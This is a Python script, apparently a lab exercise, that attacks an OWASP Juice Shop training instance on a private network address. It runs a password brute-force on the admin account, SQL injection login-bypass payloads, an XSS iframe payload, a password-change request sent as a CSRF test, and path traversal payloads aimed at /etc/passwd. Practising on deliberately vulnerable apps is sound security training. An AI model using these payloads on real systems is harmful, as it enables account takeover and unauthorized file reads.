import requests
import time

BASE_URL = "http://192.168.28.147:3000"

def test_bruteforce():
    print("\n--- [1] Testing Brute-Force ---")
    url = f"{BASE_URL}/rest/user/login"
    passwords = ["1234", "password", "letmein", "admin", "admin123"]

    for pw in passwords:
        data = {"email": "admin@juice-sh.op", "password": pw}
        try:
            r = requests.post(url, json=data)
            if "authentication" in r.text and r.status_code == 200:  # ← and로 수정
                print(f"[SUCCESS] Login bypassed! password = {pw}")
                break
            else:
                print(f"[FAIL] {pw} | Status: {r.status_code}")
            time.sleep(1)  # ← 딜레이 추가
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Connection failed: {e}")
            break

def test_sqli():
    print("\n--- [2] Testing SQL Injection ---")
    url = f"{BASE_URL}/rest/user/login"
    payloads = [
        "' OR 1=1--",
        "' OR 'a'='a",
        "admin'--"
    ]

    for p in payloads:
        data = {"email": p, "password": "anything"}
        try:
            r = requests.post(url, json=data)
            print(f"[TEST] payload = {p} | Status: {r.status_code}")
            if "authentication" in r.text and r.status_code == 200:  # ← and로 수정
                print("⚠️ Possible SQL Injection (login bypass)")
                break
            else:
                print("✔️ Not vulnerable")
            time.sleep(1)  # ← 딜레이 추가
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Connection failed: {e}")

def test_xss():
    print("\n--- [3] Testing XSS ---")
    url = f"{BASE_URL}/rest/products/search"
    payload = "<iframe src=\"javascript:alert('XSS_Success')\"></iframe>"
    params = {"q": payload}

    try:
        r = requests.get(url, params=params)
        print(f"[TEST] XSS payload sent | Status: {r.status_code}")
        if payload in r.text:
            print("⚠️ Reflected XSS 가능성 있음")
        else:
            print("✔️ 필터링됨")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Connection failed: {e}")

def test_csrf():
    print("\n--- [4] Testing CSRF (Missing Token) ---")
    login_url = f"{BASE_URL}/rest/user/login"
    login_data = {"email": "admin@juice-sh.op", "password": "admin123"}

    try:
        r_login = requests.post(login_url, json=login_data)
        if r_login.status_code != 200 or "authentication" not in r_login.text:
            print("[INFO] Login failed, skipping CSRF test.")
            return

        token = r_login.json().get("authentication", {}).get("token")
        print("[INFO] JWT Token obtained.")

        target_url = f"{BASE_URL}/rest/user/change-password"
        data = {
            "current": "admin123",          # ← current 추가
            "password": "newpass123",
            "repeatPassword": "newpass123"
        }
        headers = {"Authorization": f"Bearer {token}"}

        time.sleep(1)
        response = requests.get(target_url, params=data, headers=headers)  # GET 방식
        print(f"[TEST] Target URL: {target_url} | Status: {response.status_code}")

        if response.status_code == 200:
            print("⚠️ Potential CSRF Vulnerability!")
        else:
            print("✔️ Blocked or requires valid CSRF token.")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Connection failed: {e}")

def test_pathtrav():
    print("\n--- [5] Testing Path Traversal ---")
    payloads = [
        "../../etc/passwd",
        "..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd"   # ← null byte 제거, 이중 인코딩 추가
    ]

    for payload in payloads:
        url = f"{BASE_URL}/ftp/{payload}"
        try:
            response = requests.get(url)
            print(f"[TEST] Payload: {payload} | Status: {response.status_code}")
            if "root:x:" in response.text or "juice-shop" in response.text:
                print("⚠️ Potential Path Traversal Vulnerability!")
            else:
                print("✔️ Not vulnerable (or blocked)")
            time.sleep(1)  # ← 딜레이 추가
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Connection failed: {e}")

def main():
    try:
        requests.get(BASE_URL, timeout=3)
        print(f"[*] Target {BASE_URL} is reachable. Starting tests...")

        test_bruteforce()
        time.sleep(3)   # ← 테스트 간 딜레이
        test_sqli()
        time.sleep(3)
        test_xss()
        time.sleep(3)
        test_csrf()
        time.sleep(3)
        test_pathtrav()

        print("\n[*] All tests completed.")

    except requests.exceptions.RequestException:
        print(f"[FATAL] Cannot connect to target {BASE_URL}.")

if __name__ == "__main__":
    main()